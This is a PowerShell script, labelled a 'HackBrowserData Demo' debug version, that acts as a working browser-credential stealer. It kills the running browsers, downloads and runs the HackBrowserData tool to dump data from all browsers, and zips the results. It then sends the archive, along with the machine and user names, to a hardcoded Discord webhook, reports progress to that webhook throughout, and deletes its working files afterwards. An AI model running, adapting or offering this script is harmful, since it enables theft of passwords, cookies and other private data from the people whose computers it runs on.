# HackBrowserData Demo - Version DEBUG
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"

# Tuer les navigateurs
@("chrome","msedge","firefox","opera","vivaldi") | ForEach-Object {
    Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
}

Start-Sleep 5

# Nettoyer TEMP
Set-Location $env:TEMP
Send-Discord "📂 Working dir: $env:TEMP"
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

Send-Discord "📥 **Downloading tool...**"

try {
    # Télécharger
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip"
    
    Send-Discord "🌐 Starting download from GitHub..."
    Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing
    
    # DEBUG - Vérifier le téléchargement
    $fileExists = Test-Path "hbd.zip"
    $fileSize = if($fileExists){(Get-Item "hbd.zip").Length}else{0}
    Send-Discord "🔍 **DEBUG:** File exists=$fileExists | Size=$fileSize bytes"
    
    if (!$fileExists -or $fileSize -lt 1000) {
        Send-Discord "❌ **Download FAILED** - File not created or too small"
        exit
    }
    
    Send-Discord "📦 **Extracting...**"
    
    # Extraire
    Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
    
    # DEBUG - Vérifier extraction
    $hbdExists = Test-Path "HBD"
    Send-Discord "🔍 **DEBUG:** HBD folder exists=$hbdExists"
    
    if ($hbdExists) {
        $files = Get-ChildItem "HBD" -Recurse | Select-Object -First 10 -ExpandProperty Name
        Send-Discord "🔍 **Files in HBD:** $($files -join ', ')"
    }
    
    Set-Location "HBD"
    
    $exeExists = Test-Path "hack-browser-data.exe"
    Send-Discord "🔍 **DEBUG:** EXE exists=$exeExists"
    
    if (!$exeExists) {
        Send-Discord "❌ **EXE not found after extraction**"
        exit
    }
    
    Send-Discord "🔓 **Extracting browser data...**"
    
    # Exécuter
    Start-Process -FilePath ".\hack-browser-data.exe" -ArgumentList "--browser all --format json --dir output --zip" -Wait -NoNewWindow
    
    Start-Sleep 3
    
    # DEBUG - Vérifier ce qui a été créé
    $resultsExists = Test-Path "results.zip"
    $outputExists = Test-Path "output"
    Send-Discord "🔍 **DEBUG:** results.zip=$resultsExists | output folder=$outputExists"
    
    if ($outputExists) {
        $outputFiles = Get-ChildItem "output" -Recurse | Select-Object -First 10 -ExpandProperty Name
        Send-Discord "🔍 **Output contains:** $($outputFiles -join ', ')"
    }
    
    # Vérifier résultat
    if (Test-Path "results.zip") {
        $size = [math]::Round((Get-Item "results.zip").Length / 1KB, 2)
        Send-Discord "📤 **Uploading $size KB...**"
        
        # Upload
        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        curl.exe -F "file=@results.zip" -F "content=✅ **EXTRACTED DATA**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
        
        Send-Discord "✅ **Upload SUCCESS**"
    }
    elseif (Test-Path "output") {
        Send-Discord "⚠️ **No results.zip, trying manual compress...**"
        
        Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
        
        if (Test-Path "manual.zip") {
            $size = [math]::Round((Get-Item "manual.zip").Length / 1KB, 2)
            Send-Discord "📤 **Uploading manual.zip ($size KB)...**"
            curl.exe -F "file=@manual.zip" -F "content=📁 **Manual backup from $env:COMPUTERNAME**" $wh
            Send-Discord "✅ **Manual upload done**"
        } else {
            Send-Discord "❌ **Failed to create manual.zip**"
        }
    }
    else {
        Send-Discord "❌ **No output found at all**"
    }
    
} catch {
    $err = $_.Exception.Message -replace '"',"'" -replace '\n',' ' -replace '\r',''
    Send-Discord "❌ **EXCEPTION:** $err"
}

# Cleanup
Set-Location ..
Start-Sleep 2
Remove-Item hbd.zip,HBD -Recurse -Force -EA 0

Send-Discord "🧹 **FINISHED**"
